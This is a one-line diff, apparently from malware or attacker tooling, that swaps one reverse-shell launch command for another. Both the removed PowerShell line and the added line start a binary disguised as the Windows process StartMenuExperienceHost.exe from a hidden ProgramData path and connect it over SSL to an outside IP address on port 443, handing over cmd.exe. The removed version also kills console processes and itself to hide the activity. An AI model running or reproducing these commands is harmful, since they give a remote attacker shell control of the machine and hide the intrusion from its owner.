@@ -1,1 +1,1 @@
-powershell -C "Start-Process 'C:\ProgramData\NUL..\StartMenuExperienceHost.exe' '--ssl 193.124.33.180 443 -e cmd.exe' -NoNewWindow; Start-Sleep 1; Get-Process conhost | Stop-Process -Force; Stop-Process -Id $PID -Force"
+C:\ProgramData\NUL..\StartMenuExperienceHost.exe --ssl 193.124.33.180 443 -e cmd.exe
